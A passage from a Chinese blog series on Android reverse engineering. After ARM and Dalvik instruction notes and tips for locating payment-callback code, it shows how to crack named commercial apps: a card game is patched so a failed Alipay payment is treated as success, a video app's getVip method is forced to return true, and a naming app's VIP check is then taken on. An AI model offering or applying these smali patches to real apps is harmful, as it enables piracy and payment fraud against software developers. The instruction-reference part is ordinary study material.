class="language-none">1、从存储器中加载括号里面的RO值给R3寄存器中2、没括号就是数据，把括号內的数据直接放入R1寄存器里面3、把{R4，LR}这两个寄存器里面的值依次放到SP指向的地址,有STM就会有LDM对应4、ADD是加，R1+PC在把值放入R1里面5、把(R3+#0x18)数据作为一个地址，然后取这个地址里面的值放入R3里面6、MOV把R0里面的值放入R4里面7、BLX是进行跳转8、把R4作为一个地址取地址里面的值，放入R129、把(byte_DA4)数据放入R2里面10、MOV这里是把#4的值放入R3里11、BLX进行跳转，SUB减12、最后MOV给值，LDM返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ARM处理器寻址方式"><a href="#ARM处理器寻址方式" class="headerlink" title="ARM处理器寻址方式"></a>ARM处理器寻址方式</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>寻址方式是根据指令中给出的地址码字段来实现寻找真实操作数地址的方式<br>了解其中一些基础的</p><h3 id="1、寄存器寻址"><a href="#1、寄存器寻址" class="headerlink" title="1、寄存器寻址"></a>1、寄存器寻址</h3><p>把R2值给R1，或者是把R1给R2在给R0</p><h3 id="2、立即寻址"><a href="#2、立即寻址" class="headerlink" title="2、立即寻址"></a>2、立即寻址</h3><p>立即数，只能放在寄存器里面存放，立即数要以<code>#</code>为前缀，表示16进制的0x</p><h3 id="3、寄存器偏移寻址"><a href="#3、寄存器偏移寻址" class="headerlink" title="3、寄存器偏移寻址"></a>3、寄存器偏移寻址</h3><pre class="line-numbers language-none"><code class="language-none">LSR:逻辑右移,寄存器中字的高端空出的位补0ASR:算术右移,移位过程中保持符号位不变，即如果源操作数为正数，则字的高端空出的位补0，否则补1ROR:循环右移,由字的低端移出的位填入字的高端空岀的位RRX:带扩展的循环右移,操作数右移一位，高端空出的位用原C标志值填充。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108301753261.png" alt="image-20210830012146889"></p><h3 id="4、寄存器间接寻址"><a href="#4、寄存器间接寻址" class="headerlink" title="4、寄存器间接寻址"></a>4、寄存器间接寻址</h3><p>第二个参数都是方括号：[]</p><p>一个地址</p><p>直接取这个地址叫:直接寻址</p><p>取在该地址中取某个值叫:间接寻址</p><h3 id="5、基址寻址"><a href="#5、基址寻址" class="headerlink" title="5、基址寻址"></a>5、基址寻址</h3><p><code>:#</code></p><p>后数字如果是1,就取该地址加1后的数值</p><p>后数字如果是-1,就是数值減1作为地址</p><h3 id="6、多寄存器寻址"><a href="#6、多寄存器寻址" class="headerlink" title="6、多寄存器寻址"></a>6、多寄存器寻址</h3><pre class="line-numbers language-none"><code class="language-none">多寄存器寻址就是一次可以传送几个寄存器值，允许一条指令传送16个寄存器的任何子集或所有寄存器。多寄存器寻址指令举例如下:LDMIA R1!,{R2-R7,R12}-&gt;将R1单元中的数据读出到R2-R7，R12，R1自动加1STMIA R0!,{R3-R6,R10}-&gt;将R3-R6,R10中的数据保存到R0指向的地址，R0自动加1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用多寄存器寻址指令时，寄存器子集的顺序时由小到大的顺序排列，连续的寄存器可用<code>一</code>连接，否则，用<code>,</code>分隔书写</p><p>简单来讲</p><p>就是需要跳转的时候，把寄存器的值放在一个特定的寄存器里面，把这些值暂时存放起来</p><p>执行完特定的函数在将特定的寄存器里面的值取出来，然后在执行下一步操作</p><p>OK  这次就到这里</p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(七) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(三)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-san/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-san/</url>
      
        <content type="html"><![CDATA[<h2 id="Dalvik指令集"><a href="#Dalvik指令集" class="headerlink" title="Dalvik指令集"></a>Dalvik指令集</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基础字节码—名称后缀/字节码后缀</p><p>目的寄存器  源寄存</p><p>1、名称后缀是wide，表示数据宽度为64位</p><p>2、字节码后缀是from16，表示源寄存器为16位</p><p>3、move-wide/from16 vAA，vBBBB</p><p>分析一下：这里AA是目的寄存器没表示出来</p><p>BBBB，因为一个字母是4位，4个B就表示源寄存器为16位</p><h3 id="整体分析："><a href="#整体分析：" class="headerlink" title="整体分析："></a>整体分析：</h3><pre class="line-numbers language-none"><code class="language-none">move为基础字节码，即 opcode。wide为名称后缀标识指令操作的数据宽度为64位。from16为字节码后缀，标识源为一个16位的寄存器引用变量vAA为目的寄存器，它始终在源的前面，取值范围为v~V255。VBBBB为源寄存器，取值范围为v0~v65535Dalvik指令集中大多数指令用到了寄存器作为目的操作数或源操作数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>A/B/C/D/E/F/G/H</code>代表一个4位的数值，</p><p><code>AA/BB/CC/DD/EE/FF/GG/HH</code>代表8位的数值</p><p><code>AAAA/BBBB/…HHH</code>则代表一个16位的数值</p><h2 id="Dalvik指令使用"><a href="#Dalvik指令使用" class="headerlink" title="Dalvik指令使用"></a>Dalvik指令使用</h2><h3 id="空操作指令"><a href="#空操作指令" class="headerlink" title="空操作指令"></a>空操作指令</h3><p>空操作指令的助记符为nop</p><p>它的值为00，通常nop指令被用来作对齐代码之用，无实际操作！</p><h3 id="返回指令"><a href="#返回指令" class="headerlink" title="返回指令"></a>返回指令</h3><pre class="line-numbers language-none"><code class="language-none">1、"return-void"：表示函数从一个vod方法返回，返回值为空。2、"return vAA"：表示函数返回一个32位非对象类型的值返回值寄存器为8位的寄存器vAA3、"return-wide vAA"：表示函数返回一个64位非对象类型的值，返回值为8位的寄存器对vAA4、"return-object vAA"：这里面出现了 object，表示函数返回一个对象类型的值。返回值为8位的寄存器vAA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据定义指令"><a href="#数据定义指令" class="headerlink" title="数据定义指令"></a>数据定义指令</h3><p>可以参考这里：</p><pre class="line-numbers language-none"><code class="language-none">https://blog.csdn.net/u010164190/article/details/52089794<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172255.png" alt="image-20210731112649310"></p><p>数据定义指令用来定义程序中用到的常量，字符串，类等数据。</p><pre class="line-numbers language-none"><code class="language-none">1)"const/4 vA,#+B"：将数值符号扩展为32位后赋给寄存器vA。2)"const/16 vAA,#+BBBB"：将数据符号扩展为32位后赋给寄存器3)"const vAA，#+ BBBBBBBE"：将数值赋给寄存器vAA。4)"const/high16 vAA,#+BBBB0O000"：将数值右边零扩展为32位后赋给寄存器vAA。5)"const-string vAA,string@BBBB"：通过字符串索引构造一个字符串并赋给寄存器vAA。6)"const-string/jumbo vAA,string@BBBBBBBB"：通过字符串索引(较大)构造一个字符串并赋给寄存器vAA。7)"const-class vAA,type@BBBB"：通过类型索引获取一个类引用并赋给寄存器vAA。8)"const-class/jumbo vAAAA,type@BBBBBBBB"：通过给定的类型索引获取一个类引用并赋给寄存器 VAAAA(这条指令占用两个字节值为0xoof(Android4.0中新增的指令))。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172256.png" alt="image-20210731112701446"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172257.png" alt="image-20210731112712349"></p><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>跳转指令用于从当前地址跳转到指定的偏移处。</p><p>跳转指令</p><pre class="line-numbers language-none"><code class="language-none">(1)、goto：无条件跳转(2)、switch：分支跳转(3)、packed-switch：有规律跳转(4)、sparse-switch：无规律跳转(5)、if：条件跳转if-eq：等于/if-ne：不等于if-lt：小于/if-le：小于等于if-gt：大于/if-ge：大于等于if-eqz：等于0/if-nez：不等于0if-1tz：小于0/if-1ez：小于等于0if-gtz：大于0/if-gez：大于等于0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实例操作指令"><a href="#实例操作指令" class="headerlink" title="实例操作指令"></a>实例操作指令</h3><h4 id="1、”check-cast-vAA-type-BBBB”"><a href="#1、”check-cast-vAA-type-BBBB”" class="headerlink" title="1、”check-cast vAA,type@BBBB”"></a>1、”check-cast vAA,type@BBBB”</h4><p>check-cast vO将vAA寄存器中的对象引用转换成指定的类型。如果失败会报出 Class CastException异常。<br>如果类型B指定的是基本类型，对于非基本类型的A来说，运行时始终会失败</p><h4 id="2、”instance-of-vA-vB”"><a href="#2、”instance-of-vA-vB”" class="headerlink" title="2、”instance-of vA,vB”"></a>2、”instance-of vA,vB”</h4><p>判断vB寄存器中的对象引用是否可以转换成指定的类型。</p><p>如果可以vA寄存器赋值为1，否则vA寄存器赋值为0</p><h4 id="3、”new-instance-vAA-type-BBBB”"><a href="#3、”new-instance-vAA-type-BBBB”" class="headerlink" title="3、”new-instance vAA,type@BBBB”"></a>3、”new-instance vAA,type@BBBB”</h4><p>构造一个指定类型对象的新实例，并将对象引用赋值给vAA寄存器。</p><p>类型符type指定的类型不能是数组类。</p><h3 id="数组操作类型"><a href="#数组操作类型" class="headerlink" title="数组操作类型"></a>数组操作类型</h3><p>数组操作包括获取数组长度，新建数组，数组赋值，数组元素取值与赋值等操作。</p><h4 id="1、array-length-vA，vB”"><a href="#1、array-length-vA，vB”" class="headerlink" title="1、array-length vA，vB”"></a>1、array-length vA，vB”</h4><p>获取给定vB寄存器中数组的长度并将值赋给A寄存器。<br>数组长度指的是数组的条目个数。</p><h4 id="2、”new-array-vA-vB-type-CCCC”："><a href="#2、”new-array-vA-vB-type-CCCC”：" class="headerlink" title="2、”new-array vA,vB,type@CCCC”："></a>2、”new-array vA,vB,type@CCCC”：</h4><p>构造指定类型(type@CCCC)与大小(vB)的数组，并将值赋给vA寄存器</p><h3 id="异常指令"><a href="#异常指令" class="headerlink" title="异常指令"></a>异常指令</h3><p>“throw vAA”：抛出vAA寄存器中指定类型的异常</p><h3 id="比较指令-cmp"><a href="#比较指令-cmp" class="headerlink" title="比较指令(cmp)"></a>比较指令(cmp)</h3><p>比较指令用于对两个寄存器的值(浮点型或长整型)进行比较</p><p>大于(1)/等于(0)/小于(-1)–&gt;cmpg、cmp</p><p>大于(-1)/等于(0)/小于(1)—&gt;cmpl</p><h3 id="字段操作指令"><a href="#字段操作指令" class="headerlink" title="字段操作指令"></a>字段操作指令</h3><p>字段是成员变量</p><h4 id="普通字段"><a href="#普通字段" class="headerlink" title="普通字段"></a>普通字段</h4><p>iget读  iput写</p><p>iget读是从后往前走<br>iput写是从前往后走</p><h4 id="静态字段"><a href="#静态字段" class="headerlink" title="静态字段"></a>静态字段</h4><p>sget读  sput写</p><h3 id="方法调用指令"><a href="#方法调用指令" class="headerlink" title="方法调用指令"></a>方法调用指令</h3><p>根据方法类型不同，共有5条方法调用指令</p><pre class="line-numbers language-none"><code class="language-none">1、invoke-virtua|：调用实例的虚方法(普通方法)2、invoke-super：调用实例的父类/基类方法3、invoke-direct：调用实例的直接方法4、invoke-static：调用实例的静态方法5、invoke-interface：调用实例的接口方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数据转换指令"><a href="#数据转换指令" class="headerlink" title="数据转换指令"></a>数据转换指令</h3><p>数据转换指令用于将一种类型的数值转换成另一种类型。<br>它的格式为<code>opcode VA，vB</code></p><p>vB寄存器存放需要转换的数据，转换后的结果保存在vA寄存器中</p><p>neg—数据类型—&gt;求补</p><p>not—数据类型—&gt;求反<br>数据类型1-to-数据类型2—&gt;将数据类型1转换为数据类型2</p><h2 id="APK快速上手小技巧"><a href="#APK快速上手小技巧" class="headerlink" title="APK快速上手小技巧"></a>APK快速上手小技巧</h2><h3 id="1、快速定位关键代码"><a href="#1、快速定位关键代码" class="headerlink" title="1、快速定位关键代码"></a>1、快速定位关键代码</h3><h4 id="搜索特征字符串"><a href="#搜索特征字符串" class="headerlink" title="搜索特征字符串"></a>搜索特征字符串</h4><p>比如购买、VIP、支付取消、余额不足等</p><h4 id="搜索关键api"><a href="#搜索关键api" class="headerlink" title="搜索关键api"></a>搜索关键api</h4><p>支付宝、微信……关键字</p><h4 id="通过方法名来判断方法的功能"><a href="#通过方法名来判断方法的功能" class="headerlink" title="通过方法名来判断方法的功能"></a>通过方法名来判断方法的功能</h4><p>比如方法的名称，每个程序都有自己的规范等！</p><h4 id="反编译APK程序"><a href="#反编译APK程序" class="headerlink" title="反编译APK程序"></a>反编译APK程序</h4><p><code>AndroidMainfest.xml</code>–&gt;包名/系统版本/组件</p><h4 id="程序的主-activity-程序入口界面"><a href="#程序的主-activity-程序入口界面" class="headerlink" title="程序的主 activity(程序入口界面)"></a>程序的主 activity(程序入口界面)</h4><p>每个 Android程序有且只有一个主 Activity分析程序的执行流程</p><h4 id="需重点关注的-application"><a href="#需重点关注的-application" class="headerlink" title="需重点关注的 application"></a>需重点关注的 application</h4><pre class="line-numbers language-none"><code class="language-none">1.application执行时间2.授权验证<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2、定位关键代码的技巧"><a href="#2、定位关键代码的技巧" class="headerlink" title="2、定位关键代码的技巧"></a>2、定位关键代码的技巧</h3><h4 id="1-信息反馈法-资源id-字符串"><a href="#1-信息反馈法-资源id-字符串" class="headerlink" title="1)信息反馈法(资源id/字符串)"></a>1)信息反馈法(资源id/字符串)</h4><p>比如支付成功，支付失败等！</p><h4 id="2-特征函数法"><a href="#2-特征函数法" class="headerlink" title="2)特征函数法"></a>2)特征函数法</h4><p>比如api函数</p><h4 id="3-顺序查看法"><a href="#3-顺序查看法" class="headerlink" title="3)顺序查看法"></a>3)顺序查看法</h4><p>进行分析程序执行流程/病毒分析</p><h4 id="4-代码注入法"><a href="#4-代码注入法" class="headerlink" title="4)代码注入法"></a>4)代码注入法</h4><p>动态调式/插入log查看 logcat/分析加解密</p><h4 id="5-栈跟踪法"><a href="#5-栈跟踪法" class="headerlink" title="5)栈跟踪法"></a>5)栈跟踪法</h4><p>动态调式/函数调用流程</p><p>使用IDA进行分析</p><h4 id="6-Method-Profiling"><a href="#6-Method-Profiling" class="headerlink" title="6)Method Profiling"></a>6)Method Profiling</h4><p>方法剖析–&gt;动态调式/热点分析/函数调用流程</p><h3 id="3、关键词"><a href="#3、关键词" class="headerlink" title="3、关键词"></a>3、关键词</h3><h4 id="方法名和游戏方法名"><a href="#方法名和游戏方法名" class="headerlink" title="方法名和游戏方法名"></a>方法名和游戏方法名</h4><pre class="line-numbers language-none"><code class="language-none">onResult，onchinabilling，resulton，Paycenter，Callback<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="爱游戏方法名"><a href="#爱游戏方法名" class="headerlink" title="爱游戏方法名"></a>爱游戏方法名</h4><pre class="line-numbers language-none"><code class="language-none">paySuccess（成功）payFailed（失败）payCancel（成功）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="沃游戏方法名"><a href="#沃游戏方法名" class="headerlink" title="沃游戏方法名"></a>沃游戏方法名</h4><pre class="line-numbers language-none"><code class="language-none">OnPayResult，PyaResulton，Activity，result，callback<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4399游戏方法名"><a href="#4399游戏方法名" class="headerlink" title="4399游戏方法名"></a>4399游戏方法名</h4><pre class="line-numbers language-none"><code class="language-none">notifydelivergoods<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="支付宝和银行卡方法名"><a href="#支付宝和银行卡方法名" class="headerlink" title="支付宝和银行卡方法名"></a>支付宝和银行卡方法名</h4><pre class="line-numbers language-none"><code class="language-none">handle，message<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="移动MM方法名"><a href="#移动MM方法名" class="headerlink" title="移动MM方法名"></a>移动MM方法名</h4><pre class="line-numbers language-none"><code class="language-none">onBillingFinish，Billing，CallBack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="360支付"><a href="#360支付" class="headerlink" title="360支付"></a>360支付</h4><pre class="line-numbers language-none"><code class="language-none">onfnished on Activityresult<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="支付宝搜索字符串：9000"><a href="#支付宝搜索字符串：9000" class="headerlink" title="支付宝搜索字符串：9000"></a>支付宝搜索字符串：9000</h4><h4 id="咪咕游戏搜索常量：onresult"><a href="#咪咕游戏搜索常量：onresult" class="headerlink" title="咪咕游戏搜索常量：onresult"></a>咪咕游戏搜索常量：onresult</h4><h4 id="发送短信权"><a href="#发送短信权" class="headerlink" title="发送短信权"></a>发送短信权</h4><pre class="line-numbers language-none"><code class="language-none">android.permission.SEND_SMS<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="锁定支付模式关键字符串：CHINA-TELECOM"><a href="#锁定支付模式关键字符串：CHINA-TELECOM" class="headerlink" title="锁定支付模式关键字符串：CHINA TELECOM"></a>锁定支付模式关键字符串：CHINA TELECOM</h4><h4 id="支付上限"><a href="#支付上限" class="headerlink" title="支付上限"></a>支付上限</h4><pre class="line-numbers language-none"><code class="language-none">carrier_pay_out limit，no_propriate_pay_method<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="谷歌广告"><a href="#谷歌广告" class="headerlink" title="谷歌广告"></a>谷歌广告</h4><pre class="line-numbers language-none"><code class="language-none">Missing internet permission in AndroidManifest.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="运营商网络特征码备注"><a href="#运营商网络特征码备注" class="headerlink" title="运营商网络特征码备注"></a>运营商网络特征码备注</h4><pre class="line-numbers language-none"><code class="language-none">中国移动46000、46002、46007、46020return 0 getMobile Type中国联通46001、46006、46010return 2 getOperatorType中国电信46003、46005、46011return 1 getSimType<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实操一：单地斗地主"><a href="#实操一：单地斗地主" class="headerlink" title="实操一：单地斗地主"></a>实操一：单地斗地主</h2><p>用单机斗地主来学习</p><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172258.png" alt="image-20210731121609941"></p><p>也是有多人对战的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172259.png" alt="image-20210731121650990"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172300.png" alt="image-20210731121755310"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172301.png" alt="image-20210731121825636"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172302.png" alt="image-20210731122025190"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172303.png" alt="image-20210731122035714"></p><p>我们的目标是：跳过这个支付宝支付，购买该程序软件内容呢</p><p>采用Android Killer和jadx-gui两个软件的混合使用</p><h3 id="jadx-gui查看Java代码"><a href="#jadx-gui查看Java代码" class="headerlink" title="jadx-gui查看Java代码"></a>jadx-gui查看Java代码</h3><p>把APK丢到jadx-gui中</p><p>我们要点击这个<code>搜索类</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172304.png" alt="image-20210731122650743"></p><p>APK才算反编译完成</p><p> 我们知道的在支付宝中搜索的字符串：9000(支付成功)</p><p>进行搜索 </p><pre class="line-numbers language-none"><code class="language-none">"9000"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172305.png" alt="image-20210731125305607"></p><p>双击搜索内容 进来之后看到了 Java代码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172306.png" alt="image-20210731125408567"></p><pre><code>public void a(String str) {    String a2 = new e(str).a();</code></pre><p>理解一下：public void方法里传入了一个 String，String a2 new了一个string</p><p>我们再去看看方法a里面写了什么</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172307.png"></p><pre class="line-numbers language-none"><code class="language-none">public String a() {        return this.f554a;    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个方法最终会返回一个方法：f554a</p><p>继续向下分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172308.png" alt="image-20210731131427774"></p><p>几个if语句进行判断</p><p>成功的话进入UMGameAgent.pay这个 商品选择阶段</p><p>前面是天数 后面是金额</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172309.png" alt="image-20210731131839550"></p><p>那么这里的思路：</p><p>思路一：如果把30天20块钱的代码放入2天2块钱的代码替换后，是不是可以买30天的记牌器只用花2块钱<br>思路二：8000是支付成功和9000是支付失败，那么调换位置呢</p><p>我们继续往上看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172310.png" alt="image-20210731133606965"></p><p>看看<code>w</code>方法的调用</p><p>选中w之后 右键查找用例</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172311.png" alt="image-20210731133705286"></p><p>进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172312.png" alt="image-20210731133855934"></p><p>同样是if判断，这里是采用了赋值操作</p><p>可以看到传入两个int参数<code>i</code>和<code>i2</code>，string也进入记牌器</p><p>然后判断<code>2==i</code>、<code>7==i</code>、<code>30==i</code></p><p>然后赋值d2</p><p>那么思路三：可以将此处20改为0吗</p><h3 id="Android-Killer进行查看smali代码"><a href="#Android-Killer进行查看smali代码" class="headerlink" title="Android Killer进行查看smali代码"></a>Android Killer进行查看smali代码</h3><p>把APK丢到Android Killer中</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172313.png" alt="image-20210731124924546"></p><p>然后去搜索字符串：9000(支付成功)</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172314.png" alt="image-20210731125631487"></p><p>进行逻辑分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172315.png" alt="image-20210731125817537"></p><p>很好理解的</p><p>const-string v1：把v1定义为9000(支付成功)</p><p>equals：v0和v1进行了个比较，返回结果放到v1里面</p><p>if-eqz：如果v1等于0跳到cond_4</p><p>那么去看看cond_4</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172316.png" alt="image-20210731130120060"></p><p>继续进行逻辑分析</p><p>const-string v1：把v1定义为8000(支付失败)</p><p>invoke-static：是方法调用指令中的：调用实例的静态方法 建议回头去看一下</p><p>equals：v0和v1进行了个比较，返回结果放到v0里面</p><p>if-eqz：如果v0等于0跳到cond_1</p><p>那么我们继续 去看看cond_1</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172317.png" alt="image-20210731130523588"></p><p>goto是跳转指令中的：无条件跳转</p><p>return-void：就是结束了</p><p>那么最简单的一个方法：</p><p><code>if-eqz v1, :cond_4</code>改为<code>if-nez v1, :cond_4</code></p><p>支付失败 执行支付成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172318.png" alt="image-20210731141550040"></p><p>保存之后 编译输出</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172319.png" alt="image-20210731141815327"></p><p>进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172320.png" alt="image-20210731142113524"></p><p>可以看到我们其实 是支付失败的 但是因为执行的是支付成功</p><p>所以依然可以使用</p><p>是不是蛮简单的？但是其实并不是 我感觉要多加练习，你要抓住那个点，多加练习才可以</p><p>继续加油</p><p>再来一个实操</p><h2 id="实操二：卧龙影视"><a href="#实操二：卧龙影视" class="headerlink" title="实操二：卧龙影视"></a>实操二：卧龙影视</h2><p>以卧龙影视进行演示</p><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172321.png" alt="image-20210731142736299"></p><p>当我们点击之后 它会加载广告</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172322.png" alt="image-20210731142610317"></p><p>那么我们使用之前的方法安卓(一)是不是可以删掉第一个跳转的界面 进行去广告操作呢 是可以的</p><p>小伙伴们可以去尝试一波</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172323.png" alt="image-20210731142922092"></p><p>今天破解的就是它的Vip功能</p><p>如上操作</p><h3 id="jadx-gui查看Java代码-1"><a href="#jadx-gui查看Java代码-1" class="headerlink" title="jadx-gui查看Java代码"></a>jadx-gui查看Java代码</h3><p>要破解Vip，这里大部分所有APK的环境下都是搜索getVip</p><p>这里要注意：</p><p>1、搜索勾选代码</p><p>2、我们要破解的是用户的Vip</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172324.png" alt="image-20210731144516338"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172325.png" alt="image-20210731144549975"></p><p>往上翻 针对UserVip</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172326.png" alt="image-20210731144625436"></p><p>右键查找用例</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172327.png" alt="image-20210731144717459"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172328.png" alt="image-20210731144811658"></p><p>这是一个实体类 </p><p>分析一下</p><p>is vip(是否是Vip)、</p><p>End(vip结束时间)、Start(vip开始时间)</p><p>那么继续针对getIsVip进行查找用例</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172329.png" alt="image-20210731145545602"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172330.png" alt="image-20210731150207512"></p><p>那么我们这里：<strong>让 getVip返回值不为空</strong></p><h3 id="Android-Killer进行查看smali代码-1"><a href="#Android-Killer进行查看smali代码-1" class="headerlink" title="Android Killer进行查看smali代码"></a>Android Killer进行查看smali代码</h3><p>根据包package 在Android Killer中找对应目录</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172331.png" alt="image-20210731145626591"></p><p>注意这里是：<code>smali_classes2</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172332.png" alt="image-20210731145845850"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172333.png" alt="image-20210731150046100"></p><p>我们要改的smali代码就是<code>UserVip.smali</code></p><p>然后找到<code>public getVip()</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172334.png" alt="image-20210731150429470"></p><p>进行分析</p><p>这个方法使用到<code>locals 1</code>—个寄存器</p><p>iget读取字段，v0是我们的寄存器，p0是从之前用户判断过来的值，这里就是用户去读取v0</p><p>如果p0是Vip那么v0就是Vip，如果p0不是Vip那么v0肯定不是Vip</p><p>最后<code>return v0</code>寄存器</p><p>我们的目标是：让getvip返回值不为空就行</p><pre class="line-numbers language-none"><code class="language-none">const v0,0x1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172335.png" alt="image-20210731151039656"></p><p>回编译成功</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172336.png" alt="image-20210731151811587"></p><h3 id="关于回编译失败问题："><a href="#关于回编译失败问题：" class="headerlink" title="关于回编译失败问题："></a>关于回编译失败问题：</h3><h4 id="1、APKTOOL版本问题"><a href="#1、APKTOOL版本问题" class="headerlink" title="1、APKTOOL版本问题"></a>1、APKTOOL版本问题</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172337.png" alt="image-20210731151903070"></p><h4 id="2、Java环境问题"><a href="#2、Java环境问题" class="headerlink" title="2、Java环境问题"></a>2、Java环境问题</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172338.png" alt="image-20210731152010219"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172339.png" alt="image-20210731152028309"></p><p>然后我们继续 去查看一下</p><p>当我们注册登录之后 成功拿到Vip</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172340.png" alt="image-20210731152458569"></p><h2 id="实操三：起名软件"><a href="#实操三：起名软件" class="headerlink" title="实操三：起名软件"></a>实操三：起名软件</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>点开这个软件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172341.png" alt="image-20210731152859081"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172342.png" alt="image-20210731153021196"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172343.png" alt="image-20210731153033009"></p><p>需要Vip会员</p><p>如上操作</p><h3 id="jadx-gui查看Java代码-2"><a href="#jadx-gui查看Java代码-2" class="headerlink" title="jadx-gui查看Java代码"></a>jadx-gui查看Java代码</h3><p>针对关键字</p><pre class="line-numbers language-none"><code class="language-none">可以选择五行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172344.png" 